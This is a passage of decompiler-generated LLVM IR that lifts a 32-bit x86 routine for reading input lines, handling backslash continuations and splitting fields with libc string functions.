  %v2_8054170 = load i32, i32* %arg1, align 4
  %v3_8054170 = load i32, i32* @esp, align 4
  %v4_8054170 = add i32 %v3_8054170, -4
  %v5_8054170 = inttoptr i32 %v4_8054170 to i32*
  store i32 %v2_8054170, i32* %v5_8054170, align 4
  %v3_8054172 = load i32, i32* %v2_8054172, align 4
  %v1_8054175 = load i32, i32* @edi, align 4
  %v2_8054175 = sub i32 %v3_8054172, %v1_8054175
  %v2_8054177 = add i32 %v3_8054170, -8
  %v3_8054177 = inttoptr i32 %v2_8054177 to i32*
  store i32 %v2_8054175, i32* %v3_8054177, align 4
  %v0_8054178 = load i32, i32* @edi, align 4
  store i32 %v0_8054178, i32* %eax.global-to-local, align 4
  %v4_805417a = load i32, i32* %v3_805416d, align 4
  %v5_805417a = add i32 %v4_805417a, %v0_8054178
  store i32 %v5_805417a, i32* %eax.global-to-local, align 4
  %v2_805417d = add i32 %v3_8054170, -12
  %v3_805417d = inttoptr i32 %v2_805417d to i32*
  store i32 %v5_805417a, i32* %v3_805417d, align 4
  %v0_805417e = call i32 @fgets()
  store i32 %v0_805417e, i32* %eax.global-to-local, align 4
  %v0_8054183 = load i32, i32* @esp, align 4
  %v1_8054186 = icmp eq i32 %v0_805417e, 0
  %v1_8054188 = icmp eq i1 %v1_8054186, false
  br i1 %v1_8054188, label %dec_label_pc_80541a1, label %dec_label_pc_805418a

dec_label_pc_805418a:                             ; preds = %dec_label_pc_8054170
  %v3_805418a = load i32, i32* %v2_8054172, align 4
  %v5_805418a = add i32 %v0_8054183, 8
  %v6_805418a = inttoptr i32 %v5_805418a to i32*
  store i32 %v3_805418a, i32* %v6_805418a, align 4
  %v1_805418d = add i32 %v0_8054183, 4
  %v2_805418d = inttoptr i32 %v1_805418d to i32*
  store i32 0, i32* %v2_805418d, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_8054191 = load i32, i32* %v3_805416d, align 4
  %v6_8054191 = inttoptr i32 %v0_8054183 to i32*
  store i32 %v3_8054191, i32* %v6_8054191, align 4
  %v0_8054194 = load i8*, i8** %stack_var_-40, align 4
  %v5_8054194 = call i32 @__GI_memset(i8* %v0_8054194, i32 %v2_8054118, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054194, i32* %eax.global-to-local, align 4
  %v0_8054199 = load i32, i32* @esp, align 4
  %v1_8054199 = add i32 %v0_8054199, 12
  %v0_805435b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054358

dec_label_pc_80541a1:                             ; preds = %dec_label_pc_8054170
  %v3_80541a1 = load i32, i32* %v3_805416d, align 4
  store i32 %v3_80541a1, i32* %ebx.global-to-local, align 4
  %v1_80541a4 = load i32, i32* @edi, align 4
  %v2_80541a4 = add i32 %v1_80541a4, %v3_80541a1
  store i32 %v2_80541a4, i32* %eax.global-to-local, align 4
  %v2_80541a7 = add i32 %v0_8054183, 8
  %v3_80541a7 = inttoptr i32 %v2_80541a7 to i32*
  store i32 %v2_80541a4, i32* %v3_80541a7, align 4
  %v0_80541a8 = load i8*, i8** %stack_var_-40, align 4
  %v3_80541a8 = call i32 @strlen(i8* %v0_80541a8)
  store i32 %v3_80541a8, i32* %eax.global-to-local, align 4
  %v0_80541ad = load i32, i32* @esp, align 4
  %v1_80541ad = inttoptr i32 %v0_80541ad to i32*
  store i32 10, i32* %v1_80541ad, align 4
  %v0_80541b4 = load i32, i32* @edi, align 4
  %v2_80541b4 = add i32 %v0_80541b4, %v3_80541a8
  store i32 %v2_80541b4, i32* @edi, align 4
  %v0_80541b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541b6 = load i32, i32* @esp, align 4
  %v2_80541b6 = add i32 %v1_80541b6, -4
  %v3_80541b6 = inttoptr i32 %v2_80541b6 to i32*
  store i32 %v0_80541b6, i32* %v3_80541b6, align 4
  %v0_80541b7 = load i8*, i8** %stack_var_-40, align 4
  %v4_80541b7 = call i32 @__GI_strchr(i8* %v0_80541b7, i32 %v2_8054118)
  store i32 %v4_80541b7, i32* %eax.global-to-local, align 4
  %v0_80541bc = load i32, i32* @esp, align 4
  %v1_80541bc = inttoptr i32 %v0_80541bc to i32*
  %v2_80541bc = load i32, i32* %v1_80541bc, align 4
  store i32 %v2_80541bc, i32* @ecx, align 4
  %v3_80541bc = add i32 %v0_80541bc, 4
  %v1_80541bf = inttoptr i32 %v3_80541bc to i32*
  %v2_80541bf = load i32, i32* %v1_80541bf, align 4
  store i32 %v2_80541bf, i32* @ebx, align 4
  %v2_80541c0 = icmp eq i32 %v4_80541b7, 0
  br i1 %v2_80541c0, label %dec_label_pc_80541d1, label %dec_label_pc_80541c4

dec_label_pc_80541c4:                             ; preds = %dec_label_pc_80541a1
  %v5_80541b7 = inttoptr i32 %v4_80541b7 to i8*
  %v3_80541c4 = load i8, i8* %v5_80541b7, align 1
  %v4_80541c4 = zext i8 %v3_80541c4 to i32
  %v7_80541c4 = and i32 %v4_80541b7, -256
  %v8_80541c4 = or i32 %v4_80541c4, %v7_80541c4
  %v0_80541c6 = load i32, i32* @edi, align 4
  %v1_80541c6 = add i32 %v0_80541c6, -1
  store i32 %v1_80541c6, i32* @edi, align 4
  %v1_80541c7 = add i32 %v8_80541c4, -1
  %v10_80541c7 = trunc i32 %v1_80541c7 to i8
  store i32 %v1_80541c7, i32* %eax.global-to-local, align 4
  store i8 %v10_80541c7, i8* %v5_80541b7, align 1
  %v0_80541ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80541ca = trunc i32 %v0_80541ca to i8
  %v10_80541ca = icmp eq i8 %v1_80541ca, 92
  %v1_80541cc = icmp eq i1 %v10_80541ca, false
  br i1 %v1_80541cc, label %dec_label_pc_8054232, label %dec_label_pc_80541ce

dec_label_pc_80541ce:                             ; preds = %dec_label_pc_80541c4
  %v0_80541ce = load i32, i32* @edi, align 4
  %v1_80541ce = add i32 %v0_80541ce, -1
  store i32 %v1_80541ce, i32* @edi, align 4
  br label %dec_label_pc_8054170

dec_label_pc_80541d1:                             ; preds = %dec_label_pc_80541a1
  %v3_80541d1 = load i8, i8* %v2_80541d1, align 1
  %v4_80541d1 = icmp eq i8 %v3_80541d1, 0
  br i1 %v4_80541d1, label %dec_label_pc_80541fe, label %dec_label_pc_80541d7

dec_label_pc_80541d7:                             ; preds = %dec_label_pc_80541d1
  %v3_80541d7 = load i32, i32* %v2_8054172, align 4
  %v1_80541da = add i32 %v3_80541d7, 4096
  store i32 %v1_80541da, i32* %eax.global-to-local, align 4
  store i32 %v1_80541da, i32* %v2_8054172, align 4
  %v0_80541e2 = load i32, i32* %eax.global-to-local, align 4
  %v4_80541e2 = load i32, i32* %v2_8054165, align 4
  %v5_80541e2 = add i32 %v4_80541e2, %v0_80541e2
  store i32 %v5_80541e2, i32* %eax.global-to-local, align 4
  %v1_80541e5 = load i32, i32* @esp, align 4
  %v2_80541e5 = add i32 %v1_80541e5, -4
  %v3_80541e5 = inttoptr i32 %v2_80541e5 to i32*
  store i32 %v5_80541e2, i32* %v3_80541e5, align 4
  %v3_80541e6 = load i32, i32* %v2_805412a, align 4
  %v5_80541e6 = add i32 %v1_80541e5, -8
  %v6_80541e6 = inttoptr i32 %v5_80541e6 to i32*
  store i32 %v3_80541e6, i32* %v6_80541e6, align 4
  %v0_80541e9 = load i8*, i8** %stack_var_-40, align 4
  %tmp48 = bitcast i8* %v0_80541e9 to i32*
  %v4_80541e9 = call i32 @realloc(i32* %tmp48, i32 %v2_8054118)
  store i32 %v4_80541e9, i32* %eax.global-to-local, align 4
  store i32 %v4_80541e9, i32* %v2_805412a, align 4
  %v4_80541f1 = load i32, i32* %v2_8054165, align 4
  %v5_80541f1 = add i32 %v4_80541f1, %v4_80541e9
  store i32 %v5_80541f1, i32* %eax.global-to-local, align 4
  store i32 %v5_80541f1, i32* %v3_805416d, align 4
  %v0_80541f7 = load i32, i32* @esp, align 4
  %v1_80541f7 = inttoptr i32 %v0_80541f7 to i32*
  %v2_80541f7 = load i32, i32* %v1_80541f7, align 4
  store i32 %v2_80541f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054170

dec_label_pc_80541fe:                             ; preds = %dec_label_pc_80541d1, %dec_label_pc_805422d
  %v2_80541fe = load i32, i32* %arg1, align 4
  %v1_8054200 = add i32 %v2_80541fe, 52
  %v2_8054200 = inttoptr i32 %v1_8054200 to i32*
  %v3_8054200 = load i32, i32* %v2_8054200, align 4
  %v4_8054200 = icmp eq i32 %v3_8054200, 0
  br i1 %v4_8054200, label %dec_label_pc_805421f, label %dec_label_pc_8054206

dec_label_pc_8054206:                             ; preds = %dec_label_pc_80541fe
  %v1_8054206 = add i32 %v2_80541fe, 16
  %v2_8054206 = inttoptr i32 %v1_8054206 to i32*
  %v3_8054206 = load i32, i32* %v2_8054206, align 4
  store i32 %v3_8054206, i32* %eax.global-to-local, align 4
  %v2_8054209 = add i32 %v2_80541fe, 24
  %v3_8054209 = inttoptr i32 %v2_8054209 to i32*
  %v4_8054209 = load i32, i32* %v3_8054209, align 4
  %v10_8054209 = icmp ult i32 %v3_8054206, %v4_8054209
  %v1_805420c = icmp eq i1 %v10_8054209, false
  br i1 %v1_805420c, label %dec_label_pc_8054217, label %dec_label_pc_805420e

dec_label_pc_805420e:                             ; preds = %dec_label_pc_8054206
  %v1_805420e = inttoptr i32 %v3_8054206 to i8*
  %v2_805420e = load i8, i8* %v1_805420e, align 1
  %v3_805420e = zext i8 %v2_805420e to i32
  store i32 %v3_805420e, i32* @ecx, align 4
  %v1_8054211 = add i32 %v3_8054206, 1
  store i32 %v1_8054211, i32* %eax.global-to-local, align 4
  store i32 %v1_8054211, i32* %v2_8054206, align 4
  %v0_8054228.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8054228

dec_label_pc_8054217:                             ; preds = %dec_label_pc_8054206
  %v1_8054217 = load i32, i32* @esp, align 4
  %v2_8054217 = add i32 %v1_8054217, -4
  %v3_8054217 = inttoptr i32 %v2_8054217 to i32*
  store i32 %v2_80541fe, i32* %v3_8054217, align 4
  %v0_8054218 = load i8*, i8** %stack_var_-40, align 4
  %tmp49 = bitcast i8* %v0_8054218 to i16*
  %v3_8054218 = call i32 @getc_unlocked(i16* %tmp49)
  br label %dec_label_pc_8054225

dec_label_pc_805421f:                             ; preds = %dec_label_pc_80541fe
  %v1_805421f = load i32, i32* @esp, align 4
  %v2_805421f = add i32 %v1_805421f, -4
  %v3_805421f = inttoptr i32 %v2_805421f to i32*
  store i32 %v2_80541fe, i32* %v3_805421f, align 4
  %v0_8054220 = call i32 @__GI_fgetc()
  br label %dec_label_pc_8054225

dec_label_pc_8054225:                             ; preds = %dec_label_pc_8054217, %dec_label_pc_805421f
  %storemerge = phi i32 [ %v0_8054220, %dec_label_pc_805421f ], [ %v3_8054218, %dec_label_pc_8054217 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %storemerge, i32* @ecx, align 4
  %v0_8054227 = load i32, i32* @esp, align 4
  %v1_8054227 = inttoptr i32 %v0_8054227 to i32*
  %v2_8054227 = load i32, i32* %v1_8054227, align 4
  store i32 %v2_8054227, i32* @ebp, align 4
  br label %dec_label_pc_8054228

dec_label_pc_8054228:                             ; preds = %dec_label_pc_805420e, %dec_label_pc_8054225
  %v0_805422d = phi i32 [ %v0_8054228.pre, %dec_label_pc_805420e ], [ %storemerge, %dec_label_pc_8054225 ]
  %v10_8054228 = icmp eq i32 %v0_805422d, -1
  br i1 %v10_8054228, label %dec_label_pc_8054232, label %dec_label_pc_805422d

dec_label_pc_805422d:                             ; preds = %dec_label_pc_8054228
  %v9_805422d = icmp eq i32 %v0_805422d, 10
  %v1_8054230 = icmp eq i1 %v9_805422d, false
  br i1 %v1_8054230, label %dec_label_pc_80541fe, label %dec_label_pc_8054232

dec_label_pc_8054232:                             ; preds = %dec_label_pc_80541c4, %dec_label_pc_805422d, %dec_label_pc_8054228
  %v0_8054232 = load i32, i32* @edi, align 4
  %v1_8054232 = add i32 %v0_8054232, 1
  %v8_8054232 = icmp eq i32 %v1_8054232, 0
  store i32 %v1_8054232, i32* @edi, align 4
  %v0_8054358.pre.pre.pre = load i32, i32* @esp, align 4
  br i1 %v8_8054232, label %dec_label_pc_8054356, label %dec_label_pc_8054239

dec_label_pc_8054239:                             ; preds = %dec_label_pc_8054232
  %v1_8054239 = add i32 %v0_8054358.pre.pre.pre, 52
  %v2_8054239 = inttoptr i32 %v1_8054239 to i32*
  %v3_8054239 = load i32, i32* %v2_8054239, align 4
  %v3_805423d = load i32, i32* %v3_805416d, align 4
  store i32 %v3_805423d, i32* @ebx, align 4
  %v1_8054240 = and i32 %v3_8054239, 131072
  %v2_8054240 = icmp eq i32 %v1_8054240, 0
  %v2_8054246 = add i32 %v0_8054358.pre.pre.pre, 12
  %v3_8054246 = inttoptr i32 %v2_8054246 to i32*
  store i32 %v1_8054240, i32* %v3_8054246, align 4
  br i1 %v2_8054240, label %dec_label_pc_8054239.dec_label_pc_805425c_crit_edge, label %dec_label_pc_805424c

dec_label_pc_8054239.dec_label_pc_805425c_crit_edge: ; preds = %dec_label_pc_8054239
  %v0_805425c.pre = load i32, i32* @ebx, align 4
  %v4_805425c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805425c

dec_label_pc_805424c:                             ; preds = %dec_label_pc_8054239
  %v0_805424c = load i32, i32* @esp, align 4
  %v1_805424c = add i32 %v0_805424c, 56
  %v2_805424c = inttoptr i32 %v1_805424c to i32*
  %v3_805424c = load i32, i32* %v2_805424c, align 4
  %v1_8054250 = add i32 %v3_805424c, 1
  store i32 %v1_8054250, i32* %eax.global-to-local, align 4
  %v2_8054251 = add i32 %v0_805424c, -4
  %v3_8054251 = inttoptr i32 %v2_8054251 to i32*
  store i32 %v1_8054250, i32* %v3_8054251, align 4
  %v0_8054252 = load i32, i32* @ebx, align 4
  %v2_8054252 = add i32 %v0_805424c, -8
  %v3_8054252 = inttoptr i32 %v2_8054252 to i32*
  store i32 %v0_8054252, i32* %v3_8054252, align 4
  %v0_8054253 = call i32 @__GI_strspn()
  store i32 %v0_8054253, i32* %eax.global-to-local, align 4
  %v0_8054258 = load i32, i32* @esp, align 4
  %v3_8054258 = add i32 %v0_8054258, 4
  %v0_8054259 = load i32, i32* @ebx, align 4
  %v2_8054259 = add i32 %v0_8054259, %v0_8054253
  store i32 %v2_8054259, i32* @ebx, align 4
  %v1_805425b = inttoptr i32 %v3_8054258 to i32*
  %v2_805425b = load i32, i32* %v1_805425b, align 4
  store i32 %v2_805425b, i32* @edi, align 4
  br label %dec_label_pc_805425c

dec_label_pc_805425c:                             ; preds = %dec_label_pc_8054239.dec_label_pc_805425c_crit_edge, %dec_label_pc_805424c
  %v4_805425c = phi i32 [ %v4_805425c.pre, %dec_label_pc_8054239.dec_label_pc_805425c_crit_edge ], [ %v0_8054253, %dec_label_pc_805424c ]
  %v0_805425c = phi i32 [ %v0_805425c.pre, %dec_label_pc_8054239.dec_label_pc_805425c_crit_edge ], [ %v2_8054259, %dec_label_pc_805424c ]
  %v1_805425c = inttoptr i32 %v0_805425c to i8*
  %v2_805425c = load i8, i8* %v1_805425c, align 1
  %v3_805425c = zext i8 %v2_805425c to i32
  %v5_805425c = and i32 %v4_805425c, -256
  %v6_805425c = or i32 %v3_805425c, %v5_805425c
  store i32 %v6_805425c, i32* %eax.global-to-local, align 4
  %v4_805425e = icmp eq i8 %v2_805425c, 0
  br i1 %v4_805425e, label %dec_label_pc_805412a, label %dec_label_pc_8054266

dec_label_pc_8054266:                             ; preds = %dec_label_pc_805425c
  %v0_8054266 = load i32, i32* @esp, align 4
  %v1_8054266 = add i32 %v0_8054266, 56
  %v2_8054266 = inttoptr i32 %v1_8054266 to i32*
  %v3_8054266 = load i32, i32* %v2_8054266, align 4
  %v3_805426a = inttoptr i32 %v3_8054266 to i8*
  %v4_805426a = load i8, i8* %v3_805426a, align 1
  %v15_805426a = icmp eq i8 %v2_805425c, %v4_805426a
  br i1 %v15_805426a, label %dec_label_pc_805412a, label %dec_label_pc_8054272

dec_label_pc_8054272:                             ; preds = %dec_label_pc_8054266
  %v1_8054272 = add i32 %v0_8054266, 48
  %v2_8054272 = inttoptr i32 %v1_8054272 to i32*
  %v3_8054272 = load i32, i32* %v2_8054272, align 4
  %v3_8054276 = load i32, i32* %v2_805412a, align 4
  store i32 %v3_8054276, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  %v2_805427b = inttoptr i32 %v3_8054272 to i32*
  store i32 %v3_8054276, i32* %v2_805427b, align 4
  %v0_805427d = load i32, i32* @esp, align 4
  %v1_805427d = add i32 %v0_805427d, 4
  %v2_805427d = inttoptr i32 %v1_805427d to i32*
  %v3_805427d = load i32, i32* %v2_805427d, align 4
  %v5_805427d = add i32 %v0_805427d, -4
  %v6_805427d = inttoptr i32 %v5_805427d to i32*
  store i32 %v3_805427d, i32* %v6_805427d, align 4
  %v1_8054281 = add i32 %v0_805427d, -8
  %v2_8054281 = inttoptr i32 %v1_8054281 to i32*
  store i32 0, i32* %v2_8054281, align 4
  %v0_8054283 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054283 = add i32 %v0_805427d, -12
  %v3_8054283 = inttoptr i32 %v2_8054283 to i32*
  store i32 %v0_8054283, i32* %v3_8054283, align 4
  %v0_8054284 = load i8*, i8** %stack_var_-40, align 4
  %v5_8054284 = call i32 @__GI_memset(i8* %v0_8054284, i32 %v2_8054118, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054284, i32* %eax.global-to-local, align 4
  %v0_8054289 = load i32, i32* @esp, align 4
  %v1_805428c = add i32 %v0_8054289, 28
  %v2_805428c = inttoptr i32 %v1_805428c to i32*
  %v3_805428c = load i32, i32* %v2_805428c, align 4
  store i32 %v3_805428c, i32* %eax.global-to-local, align 4
  %v1_8054290 = add i32 %v0_8054289, 68
  %v2_8054290 = inttoptr i32 %v1_8054290 to i32*
  %v3_8054290 = load i32, i32* %v2_8054290, align 4
  %v1_8054294 = add i32 %v3_805428c, -1
  store i32 %v1_8054294, i32* %eax.global-to-local, align 4
  %v1_8054295 = add i32 %v3_8054290, 1
  store i32 %v1_8054295, i32* @edi, align 4
  %v2_8054296 = add i32 %v0_8054289, 20
  %v3_8054296 = inttoptr i32 %v2_8054296 to i32*
  store i32 %v1_8054294, i32* %v3_8054296, align 4
  %v0_805432a7 = load i32, i32* @ebx, align 4
  %v1_805432a8 = inttoptr i32 %v0_805432a7 to i8*
  %v2_805432a9 = load i8, i8* %v1_805432a8, align 1
  %v3_805432a10 = zext i8 %v2_805432a9 to i32
  %v4_805432a11 = load i32, i32* %eax.global-to-local, align 4
  %v5_805432a12 = and i32 %v4_805432a11, -256
  %v6_805432a13 = or i32 %v5_805432a12, %v3_805432a10
  store i32 %v6_805432a13, i32* %eax.global-to-local, align 4
  %v4_805432c14 = icmp eq i8 %v2_805432a9, 0
  %v1_8054342.pre = load i32, i32* @esp, align 4
  br i1 %v4_805432c14, label %dec_label_pc_8054342, label %dec_label_pc_8054330

dec_label_pc_805429f:                             ; preds = %dec_label_pc_8054338
  %v1_805429f = add i32 %v0_805429f, 48
  %v2_805429f = inttoptr i32 %v1_805429f to i32*
  %v3_805429f = load i32, i32* %v2_805429f, align 4
  %v2_80542a3 = add i32 %v0_805429f, 8
  %v3_80542a3 = inttoptr i32 %v2_80542a3 to i32*
  %v4_80542a3 = load i32, i32* %v3_80542a3, align 4
  %v15_80542a3 = icmp eq i32 %v0_8054338, %v4_80542a3
  %v1_80542a7 = inttoptr i32 %v3_805429f to i32*
  %v2_80542a7 = load i32, i32* %v1_80542a7, align 4
  store i32 %v2_80542a7, i32* %eax.global-to-local, align 4
  %v3_80542a9 = mul i32 %v0_8054338, 4
  %v4_80542a9 = add i32 %v2_80542a7, %v3_80542a9
  %v5_80542a9 = inttoptr i32 %v4_80542a9 to i32*
  store i32 %v0_80542a9, i32* %v5_80542a9, align 4
  %v1_80542ac = icmp eq i1 %v15_80542a3, false
  %v0_80542b8.pre = load i32, i32* @esp, align 4
  br i1 %v1_80542ac, label %dec_label_pc_80542b8, label %dec_label_pc_80542ae

dec_label_pc_80542ae:                             ; preds = %dec_label_pc_805429f
  %v1_80542ae = add i32 %v0_80542b8.pre, 52
  %v2_80542ae = inttoptr i32 %v1_80542ae to i32*
  %v3_80542ae = load i32, i32* %v2_80542ae, align 4
  %v4_80542ae = and i32 %v3_80542ae, 262144
  %v5_80542ae = icmp eq i32 %v4_80542ae, 0
  %v1_80542b6 = icmp eq i1 %v5_80542ae, false
  br i1 %v1_80542b6, label %dec_label_pc_80542d0, label %dec_label_pc_80542b8

dec_label_pc_80542b8:                             ; preds = %dec_label_pc_805429f, %dec_label_pc_80542ae
  %v1_80542b8 = add i32 %v0_80542b8.pre, 56
  %v2_80542b8 = inttoptr i32 %v1_80542b8 to i32*
  %v3_80542b8 = load i32, i32* %v2_80542b8, align 4
  store i32 %v3_80542b8, i32* %eax.global-to-local, align 4
  %v1_80542bc = inttoptr i32 %v3_80542b8 to i8*
  %v2_80542bc = load i8, i8* %v1_80542bc, align 1
  %v3_80542bc = icmp eq i8 %v2_80542bc, 0
  %v1_80542bf = icmp eq i1 %v3_80542bc, false
  br i1 %v1_80542bf, label %dec_label_pc_80542c3, label %dec_label_pc_80542c1

dec_label_pc_80542c1:                             ; preds = %dec_label_pc_80542b8
  %v0_80542c1 = load i32, i32* @edi, align 4
  store i32 %v0_80542c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542c3

dec_label_pc_80542c3:                             ; preds = %dec_label_pc_80542b8, %dec_label_pc_80542c1
  %v0_80542c3 = phi i32 [ %v3_80542b8, %dec_label_pc_80542b8 ], [ %v0_80542c1, %dec_label_pc_80542c1 ]
  %v2_80542c3 = add i32 %v0_80542b8.pre, -4
  %v3_80542c3 = inttoptr i32 %v2_80542c3 to i32*
  store i32 %v0_80542c3, i32* %v3_80542c3, align 4
  %v0_80542c4 = load i32, i32* @ebx, align 4
  %v2_80542c4 = add i32 %v0_80542b8.pre, -8
  %v3_80542c4 = inttoptr i32 %v2_80542c4 to i32*
  store i32 %v0_80542c4, i32* %v3_80542c4, align 4
  %v0_80542c5 = call i32 @strcspn()
  store i32 %v0_80542c5, i32* %eax.global-to-local, align 4
  %v0_80542ca = load i32, i32* @esp, align 4
  %v1_80542ca = inttoptr i32 %v0_80542ca to i32*
  %v2_80542ca = load i32, i32* %v1_80542ca, align 4
  store i32 %v2_80542ca, i32* @ecx, align 4
  %v0_80542cb = load i32, i32* @ebx, align 4
  %v2_80542cb = add i32 %v0_80542cb, %v0_80542c5
  store i32 %v2_80542cb, i32* @ebx, align 4
  %v3_80542cd = add i32 %v0_80542ca, 8
  br label %dec_label_pc_80542fd

dec_label_pc_80542d0:                             ; preds = %dec_label_pc_80542ae
  %v1_80542d0 = add i32 %v0_80542b8.pre, 56
  %v2_80542d0 = inttoptr i32 %v1_80542d0 to i32*
  %v3_80542d0 = load i32, i32* %v2_80542d0, align 4
  %v1_80542d4 = inttoptr i32 %v3_80542d0 to i8*
  %v2_80542d4 = load i8, i8* %v1_80542d4, align 1
  %v3_80542d4 = zext i8 %v2_80542d4 to i32
  store i32 %v3_80542d4, i32* %eax.global-to-local, align 4
  %v2_80542d7 = add i32 %v0_80542b8.pre, -4
  %v3_80542d7 = inttoptr i32 %v2_80542d7 to i32*
  store i32 %v3_80542d4, i32* %v3_80542d7, align 4
  %v0_80542d8 = load i32, i32* @ebx, align 4
  %v2_80542d8 = add i32 %v0_80542b8.pre, -8
  %v3_80542d8 = inttoptr i32 %v2_80542d8 to i32*
  store i32 %v0_80542d8, i32* %v3_80542d8, align 4
  %v0_80542d9 = call i32 @__GI_strchrnul()
  store i32 %v0_80542d9, i32* %eax.global-to-local, align 4
  %v0_80542de = load i32, i32* @esp, align 4
  %v1_80542de = inttoptr i32 %v0_80542de to i32*
  %v2_80542de = load i32, i32* %v1_80542de, align 4
  store i32 %v2_80542de, i32* %ebx.global-to-local, align 4
  %v3_80542df = add i32 %v0_80542de, 8
  store i32 %v0_80542d9, i32* @ebx, align 4
  %v1_80542e2 = add i32 %v0_80542de, 20
  %v2_80542e2 = inttoptr i32 %v1_80542e2 to i32*
  %v3_80542e2 = load i32, i32* %v2_80542e2, align 4
  %v4_80542e2 = icmp eq i32 %v3_80542e2, 0
  %v1_80542e7 = icmp eq i1 %v4_80542e2, false
  br i1 %v1_80542e7, label %dec_label_pc_80542ec, label %dec_label_pc_80542fd

dec_label_pc_80542eb:                             ; preds = %dec_label_pc_80542ec
  %v1_80542eb = add i32 %v0_80542eb, -1
  store i32 %v1_80542eb, i32* @ebx, align 4
  br label %dec_label_pc_80542ec

dec_label_pc_80542ec:                             ; preds = %dec_label_pc_80542d0, %dec_label_pc_80542eb
  %v1_80542f0 = phi i32 [ %v3_80542fa, %dec_label_pc_80542eb ], [ %v3_80542df, %dec_label_pc_80542d0 ]
  %v0_80542ec = phi i32 [ %v1_80542eb, %dec_label_pc_80542eb ], [ %v0_80542d9, %dec_label_pc_80542d0 ]
  %v1_80542ec = add i32 %v0_80542ec, -1
  %v2_80542ec = inttoptr i32 %v1_80542ec to i8*
  %v3_80542ec = load i8, i8* %v2_80542ec, align 1
  %v4_80542ec = zext i8 %v3_80542ec to i32
  store i32 %v4_80542ec, i32* %eax.global-to-local, align 4
  %v2_80542f0 = add i32 %v1_80542f0, -4
  %v3_80542f0 = inttoptr i32 %v2_80542f0 to i32*
  store i32 %v4_80542ec, i32* %v3_80542f0, align 4
  %v0_80542f1 = load i32, i32* @edi, align 4
  %v2_80542f1 = add i32 %v1_80542f0, -8
  %v3_80542f1 = inttoptr i32 %v2_80542f1 to i32*
  store i32 %v0_80542f1, i32* %v3_80542f1, align 4
  %v0_80542f2 = load i8*, i8** %stack_var_-40, align 4
  %v4_80542f2 = call i32 @__GI_strchr(i8* %v0_80542f2, i32 %v2_8054118)
  store i32 %v4_80542f2, i32* %eax.global-to-local, align 4
  %v0_80542f7 = load i32, i32* @esp, align 4
  %v3_80542f7 = add i32 %v0_80542f7, 4
  %v1_80542f8 = icmp eq i32 %v4_80542f2, 0
  %v1_80542fa = inttoptr i32 %v3_80542f7 to i32*
  %v2_80542fa = load i32, i32* %v1_80542fa, align 4
  store i32 %v2_80542fa, i32* @ecx, align 4
  %v3_80542fa = add i32 %v0_80542f7, 8
  %v1_80542fb = icmp eq i1 %v1_80542f8, false
  %v0_80542eb = load i32, i32* @ebx, align 4
  br i1 %v1_80542fb, label %dec_label_pc_80542eb, label %dec_label_pc_80542fd

dec_label_pc_80542fd:                             ; preds = %dec_label_pc_80542ec, %dec_label_pc_80542d0, %dec_label_pc_80542c3
  %v0_8054310 = phi i32 [ %v0_80542d9, %dec_label_pc_80542d0 ], [ %v2_80542cb, %dec_label_pc_80542c3 ], [ %v0_80542eb, %dec_label_pc_80542ec ]
  %v4_8054301 = phi i32 [ %v0_80542d9, %dec_label_pc_80542d0 ], [ %v0_80542c5, %dec_label_pc_80542c3 ], [ %v4_80542f2, %dec_label_pc_80542ec ]
  %v0_80542fd = phi i32 [ %v3_80542df, %dec_label_pc_80542d0 ], [ %v3_80542cd, %dec_label_pc_80542c3 ], [ %v3_80542fa, %dec_label_pc_80542ec ]
  %v1_80542fd = add i32 %v0_80542fd, 56
  %v2_80542fd = inttoptr i32 %v1_80542fd to i32*
  %v3_80542fd = load i32, i32* %v2_80542fd, align 4
  %v1_8054301 = inttoptr i32 %v0_8054310 to i8*
  %v2_8054301 = load i8, i8* %v1_8054301, align 1
  %v3_8054301 = zext i8 %v2_8054301 to i32
  %v5_8054301 = and i32 %v4_8054301, -256
  %v6_8054301 = or i32 %v3_8054301, %v5_8054301
  store i32 %v6_8054301, i32* %eax.global-to-local, align 4
  %v3_8054303 = inttoptr i32 %v3_80542fd to i8*
  %v4_8054303 = load i8, i8* %v3_8054303, align 1
  %v15_8054303 = icmp eq i8 %v2_8054301, %v4_8054303
  %v1_8054305 = icmp eq i1 %v15_8054303, false
  br i1 %v1_8054305, label %dec_label_pc_805430c, label %dec_label_pc_8054307

dec_label_pc_8054307:                             ; preds = %dec_label_pc_80542fd
  store i8 0, i8* %v1_8054301, align 1
  br label %dec_label_pc_8054314

dec_label_pc_805430c:                             ; preds = %dec_label_pc_80542fd
  %v4_805430c = icmp eq i8 %v2_8054301, 0
  br i1 %v4_805430c, label %dec_label_pc_8054314, label %dec_label_pc_8054310

dec_label_pc_8054310:                             ; preds = %dec_label_pc_805430c
  store i8 0, i8* %v1_8054301, align 1
  %v0_8054313 = load i32, i32* @ebx, align 4
  %v1_8054313 = add i32 %v0_8054313, 1
  store i32 %v1_8054313, i32* @ebx, align 4
  br label %dec_label_pc_8054314

dec_label_pc_8054314:                             ; preds = %dec_label_pc_805430c, %dec_label_pc_8054307, %dec_label_pc_8054310
  %v0_8054314 = load i32, i32* @esp, align 4
  %v1_8054314 = add i32 %v0_8054314, 52
  %v2_8054314 = inttoptr i32 %v1_8054314 to i32*
  %v3_8054314 = load i32, i32* %v2_8054314, align 4
  %v4_8054314 = and i32 %v3_8054314, 65536
  %v5_8054314 = icmp eq i32 %v4_8054314, 0
  br i1 %v5_8054314, label %dec_label_pc_8054314.dec_label_pc_8054329_crit_edge, label %dec_label_pc_805431e

dec_label_pc_8054314.dec_label_pc_8054329_crit_edge: ; preds = %dec_label_pc_8054314
  %v0_805432a.pre = load i32, i32* @ebx, align 4
  %v4_805432a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054329

dec_label_pc_805431e:                             ; preds = %dec_label_pc_8054314
  %v0_805431e = load i32, i32* @edi, align 4
  %v2_805431e = add i32 %v0_8054314, -4
